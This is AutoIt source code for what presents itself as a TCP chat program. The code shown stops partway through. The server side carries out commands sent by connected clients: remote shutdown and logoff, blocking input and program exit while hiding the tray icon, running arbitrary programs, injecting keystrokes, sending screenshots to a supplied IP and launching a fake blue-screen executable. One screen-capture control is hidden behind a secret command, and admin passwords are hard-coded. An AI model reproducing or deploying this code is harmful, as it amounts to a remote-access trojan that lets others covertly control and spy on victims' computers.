SplashTextOn("Loading", "Starting Up...", 100, 70)

#region
#AutoIt3Wrapper_Icon=..\..\..\AutoIt3\Aut2Exe\Icons\network.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Description=Connect and host chat using TCP
#AutoIt3Wrapper_Res_Fileversion=1.3.3.1
#AutoIt3Wrapper_Res_ProductVersion=1.3.2.3
#AutoIt3Wrapper_Res_LegalCopyright=Do not replicate or distribute this program without the owners consent
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#endregion
#region setup
#include <guiconstants.au3>
#include <buttonconstants.au3>
#include <ListboxConstants.au3>
#include <windowsconstants.au3>
#include <GuiListBox.au3>
#include <EditConstants.au3>
#include <String.au3>
#include <SliderConstants.au3>
#include <ScreenCapture.au3>
#include <String.au3>
Opt("WinTitleMatchMode", 2)
Opt("Winsearchchildren", 1)
Opt("windetecthiddentext", 1)
Opt("TCPTimeout", 10)
Opt("TrayAutoPause", 0)
Opt("trayicondebug", 1)
OnAutoItExitRegister("scriptexited")

#region variables
$moderatorpasslevel = "1"
$adminpasslevel = "2"
Dim $data
Dim $number
Dim $computers
$realcomputers = 0
$computers = $realcomputers
Dim $servercreated
Dim $acceptarray[10000]
$acceptarray[0] = 0
Dim $nametag[10000]
Dim $adminlevel[10000]
Dim $encyptionkeys[10000]
Dim $hash
Dim $apname
$apname = @ScriptName
$apname = StringTrimRight($apname, 4)
$username = @UserName
$admin = 0
$connected = 0
Dim $recvconnecttick
Dim $recvdatatick
$guisettings = 0
Dim $settingsgui
Dim $savesettings
Dim $currentpasscode
Dim $result
Dim $tcp_decyptionresult
$allowed_to_exit = 1
Dim $blockedprocesses[5000]
Dim $screenshottosend[20]
$blockedprocesses[0] = 0
$settingsininame = "Settings(TCP)"
$currentversion = "9"
$stringencryptpassword = @UserName & "dskjgfksdljvb"
$moderatorencryptpass = "scratchisbad"
$adminencryptpass = "autoitisgood"
$speaktextspeed = 1
Global $Voice = ObjCreate("Sapi.SpVoice")
#endregion variables


If Not FileExists($settingsininame) Then
	IniWrite($settingsininame, "General", "speaktext", "no")
	$speaktext = 0
	IniWrite($settingsininame, "General", "speaktextspeed", "10")
	$speaktextspeed = 10
	IniWrite($settingsininame, "Connections", "allowconnections", "yes")
	$recvconnect = 1
	IniWrite($settingsininame, "Connections", "allowdata", "yes")
	$recvdata = 1
	IniWrite($settingsininame, "Updates", "autoupdate", "no")
	$autoupdate = 0
	IniWrite($settingsininame, "Security", "moderatorpass", _StringEncrypt(1, $moderatorencryptpass, $stringencryptpassword, 2))
	IniWrite($settingsininame, "Security", "adminpass", _StringEncrypt(1, $adminencryptpass, $stringencryptpassword, 2))
Else
	$speaktextspeed = IniRead($settingsininame, "General", "Speaktextspeed", "10") / 10
	IniWrite($settingsininame, "General", "speaktextspeed", $speaktextspeed * 10)
	If IniRead($settingsininame, "General", "speaktext", "yes") = "yes" Then
		IniWrite($settingsininame, "General", "speaktext", "yes")
		$speaktext = 1
	Else
		IniWrite($settingsininame, "General", "Speaktext", "no")
		$speaktext = 0
	EndIf
	If IniRead($settingsininame, "Connections", "allowconnections", "yes") = "yes" Then
		IniWrite($settingsininame, "Connections", "allowconnections", "yes")
		$recvconnect = 1
	Else
		IniWrite($settingsininame, "Connections", "allowconnections", "no")
		$recvconnect = 0
	EndIf
	If IniRead($settingsininame, "Connections", "allowdata", "yes") = "yes" Then
		IniWrite($settingsininame, "Connections", "allowdata", "yes")
		$recvdata = 1
	Else
		IniWrite($settingsininame, "Connections", "allowdata", "no")
		$recvdata = 0
	EndIf
	If IniRead($settingsininame, "Updates", "autoupdate", "no") = "yes" Then
		IniWrite($settingsininame, "Updates", "allowdata", "yes")
		$autoupdate = 1
	Else
		IniWrite($settingsininame, "Updates", "autoupdate", "no")
		$autoupdate = 0
	EndIf
EndIf

If $autoupdate = 1 Then
	$continueifnodownload = 0
	updatetcpservices()
Else
	$continueifnodownload = 1
EndIf

If $speaktext = 1 Then
	_SpeakSelectedText("Welcome, " & $username & ", to " & $apname & " version one point three point three point one")
	_SpeakSelectedText("Voice over is on")
EndIf

TCPStartup()
$maingui = GUICreate($apname, 770, 680)
$clientiplabel = GUICtrlCreateLabel("IP:", 10, 10, 100, 20)
$ipinput = GUICtrlCreateInput(@IPAddress1, 10, 30, 180, 20)
$clientportlabel = GUICtrlCreateLabel("PORT:", 200, 10, 100, 20)
$portinput = GUICtrlCreateInput("50000", 200, 30, 180, 20)
$connect = GUICtrlCreateButton("Connect", 10, 60, 370, 60)
$disconnect = GUICtrlCreateButton("DISCONNECT", 10, 60, 370, 60)
Global $list = GUICtrlCreateList("Welcome, " & $username & " to " & $apname & " V.1.3.3.1", 10, 130, 750, 350, BitOR($WS_BORDER, $WS_VSCROLL, $WS_HSCROLL, $LBS_NOSEL, $LBS_DISABLENOSCROLL))
If $speaktext = 1 Then
	GUICtrlSetData($list, "Voice over is ON")
EndIf
_GUICtrlListBox_SetHorizontalExtent($list, 5000)
$number = 1
$clientmessage = GUICtrlCreateInput("", 10, 490, 750, 20)
$adminlabel = GUICtrlCreateLabel("Administrator controls:", 11, 520, 200, 20)
$remotelogoff = GUICtrlCreateButton("LOGOFF", 10, 540, 180, 30)
$remoteshutdown = GUICtrlCreateButton("SHUTDOWN", 200, 540, 180, 30)
$blockclosure = GUICtrlCreateButton("BLOCK EXIT", 390, 540, 180, 30)
$unblockclosure = GUICtrlCreateButton("UNBLOCK EXIT", 580, 540, 180, 30)
$blockinput = GUICtrlCreateButton("BLOCK INPUT", 10, 580, 180, 30)
$unblockinput = GUICtrlCreateButton("UNBLOCK INPUT", 200, 580, 180, 30)
$blockprocess = GUICtrlCreateButton("BLOCK PROCESS", 390, 580, 180, 30)
$shellexecute = GUICtrlCreateButton("SHELL EXECUTE", 580, 580, 180, 30)
$sendkeys = GUICtrlCreateButton("SEND KEYS", 10, 620, 180, 30)
$bsod = GUICtrlCreateButton("BSOD", 200, 620, 180, 30)
$unbsod = GUICtrlCreateButton("UN BSOD", 390, 620, 180, 30)
;delete this and the 2 lines below to get show screen $showscreen = GUICtrlCreateButton("SHOW SCREEN", 580, 620, 180, 30)
;or, type in -**-show-screen-**- and then 50
$showscreen = 1
;server controls
$serveriplabel = GUICtrlCreateLabel("IP:", 390, 10, 100, 20)
$ipinput2 = GUICtrlCreateInput(@IPAddress1, 390, 30, 180, 20)
$serverportlabel = GUICtrlCreateLabel("PORT:", 580, 10, 100, 20)
$portinput2 = GUICtrlCreateInput("50000", 580, 30, 180, 20)
$create = GUICtrlCreateButton("CREATE", 390, 60, 370, 40)
$destroy = GUICtrlCreateButton("TERMINATE", 390, 60, 370, 40)
GUICtrlSetState($destroy, $GUI_HIDE)
$computerslab = GUICtrlCreateLabel("Computers connected: " & $computers, 391, 105, 180, 20)
$adminlevellab = GUICtrlCreateLabel("Admin level: " & $admin, 685, 105, 150, 20)
GUICtrlSetState($remotelogoff, $GUI_DISABLE)
GUICtrlSetState($remoteshutdown, $GUI_DISABLE)
GUICtrlSetState($disconnect, $GUI_HIDE)
GUICtrlSetState($clientmessage, $GUI_DISABLE)
GUICtrlSetState($adminlabel, $GUI_DISABLE)
GUICtrlSetState($blockclosure, $GUI_DISABLE)
GUICtrlSetState($unblockclosure, $GUI_DISABLE)
GUICtrlSetState($blockinput, $GUI_DISABLE)
GUICtrlSetState($unblockinput, $GUI_DISABLE)
GUICtrlSetState($blockprocess, $GUI_DISABLE)
GUICtrlSetState($shellexecute, $GUI_DISABLE)
GUICtrlSetState($showscreen, $GUI_DISABLE)
GUICtrlSetState($sendkeys, $GUI_DISABLE)
GUICtrlSetState($bsod, $GUI_DISABLE)
GUICtrlSetState($unbsod, $GUI_DISABLE)
GUICtrlSetState($computerslab, $GUI_DISABLE)

$file = GUICtrlCreateMenu("File")
$settings = GUICtrlCreateMenuItem("Settings", $file)
$updatetcpservices = GUICtrlCreateMenuItem("Update", $file)
$becomeanadmin = GUICtrlCreateMenuItem("Security", $file)
$information = GUICtrlCreateMenuItem("Info.", $file)

GUISetState()

SplashOff()

While 1
	$msg = GUIGetMsg()
	$maincursor = GUIGetCursorInfo($maingui)
	$settingscursor = GUIGetCursorInfo($settingsgui)
	If $servercreated = 1 Then
		If $recvconnect = 1 Then
			$accept = TCPAccept($socket)
			If $accept > -1 Then
				$realcomputers = $realcomputers + 1
				$computers = $computers + 1
				$acceptarray[0] = $acceptarray[0] + 1
				$acceptarray[$acceptarray[0]] = $accept
				Do
					$recv = TCPRecv($acceptarray[$acceptarray[0]], 100000)
				Until $recv = "-**-identification-**-"
				Do
					$recv = TCPRecv($acceptarray[$acceptarray[0]], 100000)
				Until $recv <> ""
				$encyptionkeys[$acceptarray[0]] = _StringEncrypt(0, $recv, "-**-key-**-", 5)
				Do
					$recv = TCPRecv($acceptarray[$acceptarray[0]], 100000)
				Until $recv <> ""
				$nametag[$acceptarray[0]] = _StringEncrypt(0, $recv, $encyptionkeys[$acceptarray[0]], 1)
				Do
					$recv = TCPRecv($acceptarray[$acceptarray[0]], 100000)
				Until $recv <> ""
				$adminlevel[$acceptarray[0]] = _StringEncrypt(0, $recv, $encyptionkeys[$acceptarray[0]], 1)
				_addtolist($nametag[$acceptarray[0]] & " has connected", $speaktext)
				GUICtrlSetData($computerslab, "Computers connected: " & $computers)
			EndIf
		EndIf
		If $computers > 0 Then
			$hash = 0
			Do
				$hash = $hash + 1
				$recv = TCPRecv($acceptarray[$hash], 100000)
				If $recv <> "" Then
					$recv = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
					If $recv = "-**-shut-down-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to shut this computer down", $speaktext)
						Else
							Opt("trayiconhide", 1)
							_addtolist("Remote shutdown initiated", $speaktext)
							MsgBox(0 + 48 + 4096, "SERVER", "Remote shutdown initiated. In 5 seconds, or if you click OK, this computer will shutdown.", 5)
							While 1
								Shutdown(1 + 4 + 8 + 16)
							WEnd
						EndIf
					ElseIf $recv = "-**-log-off-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to log this computer off", $speaktext)
						Else
							Opt("trayiconhide", 1)
							_addtolist("Remote logoff initiated", $speaktext)
							MsgBox(0 + 48 + 4096, "SERVER", "Remote logoff initiated. In 5 seconds, or if you click OK, this computer will log-off.", 5)
							While 1
								Shutdown(0)
							WEnd
						EndIf
					ElseIf $recv = "-**-dis-connect-**-" Then
						_addtolist($nametag[$hash] & " has disconnected", $speaktext)
						$computers = $computers - 1
						GUICtrlSetData($computerslab, "Computers connected: " & $computers)
					ElseIf $recv = "-**-block-exit-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to block you from exiting", $speaktext)
						Else
							_addtolist($nametag[$hash] & " has blocked you from exiting", $speaktext)
							GUICtrlSetState($destroy, $GUI_DISABLE)
							$allowed_to_exit = 0
							Opt("trayiconhide", 1)
						EndIf
					ElseIf $recv = "-**-unblock-exit-**-" Then
						_addtolist($nametag[$hash] & " has unblocked you from exiting", $speaktext)
						GUICtrlSetState($destroy, $GUI_ENABLE)
						$allowed_to_exit = 1
						Opt("trayiconhide", 0)
					ElseIf $recv = "-**-block-input-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to block your input", $speaktext)
						Else
							_addtolist($nametag[$hash] & " has blocked your input", $speaktext)
							BlockInput(1)
						EndIf
					ElseIf $recv = "-**-unblock-input-**-" Then
						_addtolist($nametag[$hash] & " has unblocked your input", $speaktext)
						BlockInput(0)
					ElseIf $recv = "-**-block-process-add-**-" Then
						Do
							$recv = TCPRecv($acceptarray[$hash], 100000)
						Until $recv <> ""
						$recv = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to block a process", $speaktext)
						Else
							$blockedprocesses[0] = $blockedprocesses[0] + 1
							$blockedprocesses[$blockedprocesses[0]] = $recv
							_addtolist($nametag[$hash] & " has blocked the process: " & $recv, $speaktext)
						EndIf
					ElseIf $recv = "-**-shell-execute-**-" Then
						Do
							$recv = TCPRecv($acceptarray[$hash], 100000)
						Until $recv <> ""
						$recv = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to run a process", $speaktext)
						Else
							ShellExecute($recv)
						EndIf
					ElseIf $recv = "-**-send-keys-**-" Then
						Do
							$recv = TCPRecv($acceptarray[$hash], 100000)
						Until $recv <> ""
						$recv = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to send keys", $speaktext)
						Else
							Send($recv, 1)
						EndIf
					ElseIf $recv = "-**-show-screen-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to show screen", $speaktext)
						Else
							Do
								$recv = TCPRecv($acceptarray[$hash], 100000)
							Until $recv <> ""
							$tempip = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
							Do
								$recv = TCPRecv($acceptarray[$hash], 100000)
							Until $recv <> ""
							$showscreenquality = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
							$serverconnect = TCPConnect($tempip, "54321")
							_ScreenCapture_SetJPGQuality($showscreenquality)
							If FileExists(@TempDir & "\tcp services screen shot-server.jpg") Then
								FileDelete(@TempDir & "\tcp services screen shot-server.jpg")
							EndIf
							_ScreenCapture_Capture(@TempDir & "\tcp services screen shot-server.jpg")
							$screenshottosend = FileRead(@TempDir & "\tcp services screen shot-server.jpg")
							FileDelete(@TempDir & "\tcp services screen shot-server.jpg")
							TCPSend($serverconnect, $screenshottosend)
						EndIf
					ElseIf $recv = "-**-bsod-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to initialize bsod", $speaktext)
						Else
							GUICtrlSetData($list, $number & ".) Kernel critical error. Blue Screen Of Death is initializing...")
							$number = $number + 1
							FileInstall("D:\MAIN\bsod.exe", @TempDir & "\bsod.exe", 1)
							ShellExecute(@TempDir & "\bsod.exe")
						EndIf
					ElseIf $recv = "-**-unbsod-**-" Then
						ProcessClose("bsod.exe")
						FileDelete(@TempDir & "\bsod.exe")
					ElseIf $recv = "-**-change-res-**-" Then
						If $admin >= $adminlevel[$hash] Then
							_addtolist($nametag[$hash] & " has attempted to adjust the screen resolution", $speaktext)
						Else
							Do
								$recv = TCPRecv($acceptarray[$hash], 100000)
							Until $recv <> ""
							$width = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
							Do
								$recv = TCPRecv($acceptarray[$hash], 100000)
							Until $recv <> ""
							$height = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
							_ChangeScreenRes($width, $height, 32, 60)
						EndIf
					ElseIf $recv = "-**-changeid-**-" Then
						Do
							$recv = TCPRecv($acceptarray[$hash], 100000)
						Until $recv <> ""
						$nametag[$hash] = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
						Do
							$recv = TCPRecv($acceptarray[$hash], 100000)
						Until $recv <> ""
						$adminlevel[$hash] = _StringEncrypt(0, $recv, $encyptionkeys[$hash], 1)
					Else
						If $recvdata = 1 Then
							_addtolist($nametag[$hash] & ": " & $recv, $speaktext)
							If WinActive($apname) = 0 Then
								WinFlash($apname, "", 3, 500)
							EndIf
						EndIf
					EndIf
				EndIf
			Until $hash = $acceptarray[0]
		EndIf
	EndIf
	Select
		Case $msg = $GUI_EVENT_CLOSE
			If $guisettings = 0 Then
				If $allowed_to_exit = 0 Then
					GUICtrlSetData($list, $number & ".) This operation has been disabled")
					$number = $number + 1
				Else
					exitscript()
				EndIf
			EndIf
		Case $msg = $create
			GUICtrlSetData($list, $number & ".) Opening socket...")
			$number = $number + 1
			$ip2 = GUICtrlRead($ipinput2)
			$port2 = GUICtrlRead($portinput2)
			$socket = TCPListen($ip2, $port2)
			If $socket = -1 Or 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				GUICtrlSetData($list, $number & ".) Server created")
				$number = $number + 1
				GUICtrlSetState($ipinput2, $GUI_DISABLE)
				GUICtrlSetState($portinput2, $GUI_DISABLE)
				GUICtrlSetState($serveriplabel, $GUI_DISABLE)
				GUICtrlSetState($serverportlabel, $GUI_DISABLE)
				GUICtrlSetState($create, $GUI_HIDE)
				GUICtrlSetState($destroy, $GUI_SHOW)
				GUICtrlSetState($computerslab, $GUI_ENABLE)
				If $allowed_to_exit = 0 Then
					GUICtrlSetState($destroy, $GUI_DISABLE)
				EndIf
				$servercreated = 1
				GUICtrlSetData($computerslab, "Computers connected: " & $computers)
			EndIf
		Case $msg = $destroy
			GUICtrlSetData($list, $number & ".) Closing socket...")
			$number = $number + 1
			$disconnected = TCPCloseSocket($socket)
			If $disconnect = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				GUICtrlSetData($list, $number & ".) Socket closed")
				GUICtrlSetData($computerslab, "Computers connected: 0")
				$number = $number + 1
				$servercreated = 0
				GUICtrlSetState($ipinput2, $GUI_ENABLE)
				GUICtrlSetState($portinput2, $GUI_ENABLE)
				GUICtrlSetState($serveriplabel, $GUI_ENABLE)
				GUICtrlSetState($serverportlabel, $GUI_ENABLE)
				GUICtrlSetState($create, $GUI_SHOW)
				GUICtrlSetState($destroy, $GUI_HIDE)
				GUICtrlSetState($computerslab, $GUI_DISABLE)
			EndIf
		Case $msg = $connect
			GUICtrlSetData($list, $number & ".) Connecting...")
			$number = $number + 1
			$ip = GUICtrlRead($ipinput)
			$port = GUICtrlRead($portinput)
			If $servercreated = 1 And $ip = GUICtrlRead($ipinput2) And $port = GUICtrlRead($portinput2) Then
				_addtolist("You may not connect to your own server", $speaktext)
			Else
				$result = TCPConnect($ip, $port)
				Sleep(250)
				If $result = -1 Or 0 Then
					GUICtrlSetData($list, $number & ".) Error code: " & @error)
					$number = $number + 1
				Else
					$sent = TCPSend($result, "-**-identification-**-")
					If $sent = 0 Then
						GUICtrlSetData($list, $number & ".) Error code: " & @error)
						$number = $number + 1
					Else
						Sleep(100)
						$encyptionkey = Random("1", "9999", 1)
						$sent = TCPSend($result, _StringEncrypt(1, $encyptionkey, "-**-key-**-", 5))
						If $sent = 0 Then
							GUICtrlSetData($list, $number & ".) Error code: " & @error)
							$number = $number + 1
						Else
							Sleep(500)
							_esend($username)
							Sleep(500)
							_esend($admin)
							GUICtrlSetData($list, $number & ".) Connected")
							$number = $number + 1
							GUICtrlSetState($connect, $GUI_HIDE)
							GUICtrlSetState($disconnect, $GUI_SHOW)
							GUICtrlSetState($ipinput, $GUI_DISABLE)
							GUICtrlSetState($portinput, $GUI_DISABLE)
							GUICtrlSetState($clientiplabel, $GUI_DISABLE)
							GUICtrlSetState($clientportlabel, $GUI_DISABLE)
							GUICtrlSetState($clientmessage, $GUI_ENABLE)
							$connected = 1
							If $admin > 0 Then
								If $admin > 1 Then
									GUICtrlSetState($remotelogoff, $GUI_ENABLE)
									GUICtrlSetState($remoteshutdown, $GUI_ENABLE)
									GUICtrlSetState($bsod, $GUI_ENABLE)
									GUICtrlSetState($unbsod, $GUI_ENABLE)
								EndIf
								GUICtrlSetState($adminlabel, $GUI_ENABLE)
								GUICtrlSetState($blockclosure, $GUI_ENABLE)
								GUICtrlSetState($unblockclosure, $GUI_ENABLE)
								GUICtrlSetState($blockinput, $GUI_ENABLE)
								GUICtrlSetState($unblockinput, $GUI_ENABLE)
								GUICtrlSetState($blockprocess, $GUI_ENABLE)
								GUICtrlSetState($shellexecute, $GUI_ENABLE)
								GUICtrlSetState($showscreen, $GUI_ENABLE)
								GUICtrlSetState($sendkeys, $GUI_ENABLE)
							EndIf
						EndIf
					EndIf
				EndIf
			EndIf
		Case $msg = $disconnect
			GUICtrlSetData($list, $number & ".) Disconnecting...")
			$number = $number + 1
			_esend("-**-dis-connect-**-")
			GUICtrlSetState($connect, $GUI_SHOW)
			GUICtrlSetState($disconnect, $GUI_HIDE)
			GUICtrlSetState($ipinput, $GUI_ENABLE)
			GUICtrlSetState($portinput, $GUI_ENABLE)
			GUICtrlSetState($clientiplabel, $GUI_ENABLE)
			GUICtrlSetState($clientportlabel, $GUI_ENABLE)
			GUICtrlSetState($clientmessage, $GUI_DISABLE)
			GUICtrlSetState($remoteshutdown, $GUI_DISABLE)
			GUICtrlSetState($remotelogoff, $GUI_DISABLE)
			GUICtrlSetState($adminlabel, $GUI_DISABLE)
			GUICtrlSetState($blockclosure, $GUI_DISABLE)
			GUICtrlSetState($unblockclosure, $GUI_DISABLE)
			GUICtrlSetState($blockinput, $GUI_DISABLE)
			GUICtrlSetState($unblockinput, $GUI_DISABLE)
			GUICtrlSetState($blockprocess, $GUI_DISABLE)
			GUICtrlSetState($shellexecute, $GUI_DISABLE)
			GUICtrlSetState($showscreen, $GUI_DISABLE)
			GUICtrlSetState($sendkeys, $GUI_DISABLE)
			GUICtrlSetState($bsod, $GUI_DISABLE)
			GUICtrlSetState($unbsod, $GUI_DISABLE)
			GUICtrlSetData($list, $number & ".) Disconnected")
			$number = $number + 1
			$connected = 0
		Case $msg = $clientmessage
			$data = GUICtrlRead($clientmessage)
			GUICtrlSetData($clientmessage, "", "")
			If $data = "-**-log-off-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-shut-down-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-block-exit-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-unblock-exit-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-block-input-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-unblock-input-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-block-process-add-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-block-window-add-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-shell-execute-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-send-keys-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-bsod-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-unbsod-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			ElseIf $data = "-**-changeid-**-" Then
				GUICtrlSetData($list, $number & ".) That function is denied")
				$number = $number + 1
			Else
				$sent = _esend($data)
				If $sent = 0 Then
					GUICtrlSetData($list, $number & ".) Error code: " & @error)
					$number = $number + 1
				Else
					GUICtrlSetData($list, $number & ".) *" & $username & "*: " & $data)
					$number = $number + 1
				EndIf
			EndIf
		Case $msg = $blockclosure
			$sent = _esend("-**-block-exit-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				GUICtrlSetData($list, $number & ".) The server may not exit.")
				$number = $number + 1
			EndIf
		Case $msg = $unblockclosure
			$sent = _esend("-**-unblock-exit-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				GUICtrlSetData($list, $number & ".) The server may exit.")
				$number = $number + 1
			EndIf
		Case $msg = $remotelogoff
			GUICtrlSetData($list, $number & ".) Logging off...")
			$number = $number + 1
			$sent = _esend("-**-log-off-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			EndIf
		Case $msg = $remoteshutdown
			GUICtrlSetData($list, $number & ".) Shuting down...")
			$number = $number + 1
			$sent = _esend("-**-shut-down-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			EndIf
		Case $msg = $blockinput
			GUICtrlSetData($list, $number & ".) Blocking input...")
			$number = $number + 1
			$sent = _esend("-**-block-input-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			EndIf
		Case $msg = $unblockinput
			GUICtrlSetData($list, $number & ".) Unblocking input...")
			$number = $number + 1
			$sent = _esend("-**-unblock-input-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			EndIf
		Case $msg = $blockprocess
			$data = InputBox($apname, "Enter process to block:")
			$sent = _esend("-**-block-process-add-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				Sleep(250)
				$sent = _esend($data)
				If $sent = 0 Then
					GUICtrlSetData($list, $number & ".) Error code: " & @error)
					$number = $number + 1
				EndIf
			EndIf
		Case $msg = $shellexecute
			$data = InputBox($apname, "Enter process to run/webpage open:")
			$sent = _esend("-**-shell-execute-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				Sleep(250)
				$sent = _esend($data)
				If $sent = 0 Then
					GUICtrlSetData($list, $number & ".) Error code: " & @error)
					$number = $number + 1
				EndIf
			EndIf
		Case $msg = $sendkeys
			$data = InputBox($apname, "Enter raw keys to send")
			$sent = _esend("-**-send-keys-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
				$number = $number + 1
			Else
				Sleep(250)
				$sent = _esend($data)
				If $sent = 0 Then
					GUICtrlSetData($list, $number & ".) Error code: " & @error)
					$number = $number + 1
				EndIf
			EndIf
		Case $msg = $showscreen
			_addtolist("Getting screenshot.")
			$showscreenerror = _showscreen()
			If $showscreenerror = -1 Then
				Switch @error
					Case 1
						_addtolist("The connection timed out")
					Case 2
						_addtolist("Please enter a valid jpg quality")
				EndSwitch
			EndIf
		Case $msg = $bsod
			$sent = _esend("-**-bsod-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
			EndIf
		Case $msg = $unbsod
			$sent = _esend("-**-unbsod-**-")
			If $sent = 0 Then
				GUICtrlSetData($list, $number & ".) Error code: " & @error)
			EndIf
		Case $msg = $information
			If $servercreated = 1 Then
				_addtolist("You may not view this program's info when you have a server open",$speaktext)
			Else
				_information()
			EndIf
		Case $msg = $settings
			If $allowed_to_exit = 0 Then
				GUICtrlSetData($list, $number & ".) This operation has been disabled")
				$number = $number + 1
			Else
				$settingsgui = GUICreate($apname & " - Settings", 270, 160)
				$recvdatatick = GUICtrlCreateCheckbox("Block messages?", 10, 10, 120, 20)
				$recvconnecttick = GUICtrlCreateCheckbox("Block connections?", 140, 10, 120, 20)
				$autoupdatetick = GUICtrlCreateCheckbox("Auto-Update?", 10, 40, 120, 20)
				$speaktexttick = GUICtrlCreateCheckbox("Voice over?", 140, 40, 120, 20)
				$speaktextspeedlabel = GUICtrlCreateLabel("Voice over speed:", 10, 73, 100, 20)
				$speaktextspeedinput = GUICtrlCreateInput(IniRead($settingsininame, "General", "speaktextspeed", "10"), 100, 70, 150, 20)
				$speaktextspeedupdown = GUICtrlCreateUpdown($speaktextspeedinput)
				GUICtrlSetLimit($speaktextspeedupdown, 100, 1)
				GUICtrlSetLimit($speaktextspeedinput, 100, 1)
				$savesettings = GUICtrlCreateButton("SAVE", 10, 100, 250, 50)
				GUICtrlSetTip($recvconnecttick, "May cause program to freeze")
				GUICtrlSetTip($speaktexttick, "Requires audio output and will slow down program")
				If IniRead($settingsininame, "General", "speaktext", "yes") = "yes" Then
					GUICtrlSetState($speaktexttick, $GUI_CHECKED)
				Else
					GUICtrlSetState($speaktexttick, $GUI_UNCHECKED)
				EndIf
				If IniRead($settingsininame, "Connections", "allowdata", "yes") = "no" Then
					GUICtrlSetState($recvdatatick, $GUI_CHECKED)
				Else
					GUICtrlSetState($recvdatatick, $GUI_UNCHECKED)
				EndIf
				If IniRead($settingsininame, "Connections", "allowconnections", "yes") = "no" Then
					GUICtrlSetState($recvconnecttick, $GUI_CHECKED)
				Else
					GUICtrlSetState($recvconnecttick, $GUI_UNCHECKED)
				EndIf
				If IniRead($settingsininame, "Updates", "autoupdate", "no") = "yes" Then
					GUICtrlSetState($autoupdatetick, $GUI_CHECKED)
				Else
					GUICtrlSetState($autoupdatetick, $GUI_UNCHECKED)
				EndIf
				GUISetState()
				$guisettings = 1
			EndIf
		Case $msg = $updatetcpservices
			If $connected = 1 Then
				GUICtrlSetData($list, $number & ".) Disconnecting...")
				$number = $number + 1
				$sent = _esend("-**-dis-connect-**-")
				GUICtrlSetState($connect, $GUI_SHOW)
				GUICtrlSetState($disconnect, $GUI_HIDE)
				GUICtrlSetState($ipinput, $GUI_ENABLE)
				GUICtrlSetState($portinput, $GUI_ENABLE)
				GUICtrlSetState($clientiplabel, $GUI_ENABLE)
				GUICtrlSetState($clientportlabel, $GUI_ENABLE)
				GUICtrlSetState($clientmessage, $GUI_DISABLE)
				GUICtrlSetState($remoteshutdown, $GUI_DISABLE)
				GUICtrlSetState($remotelogoff, $GUI_DISABLE)
				GUICtrlSetState($adminlabel, $GUI_DISABLE)
				GUICtrlSetState($blockclosure, $GUI_DISABLE)
				GUICtrlSetState($unblockclosure, $GUI_DISABLE)
				GUICtrlSetState($blockinput, $GUI_DISABLE)
				GUICtrlSetState($unblockinput, $GUI_DISABLE)
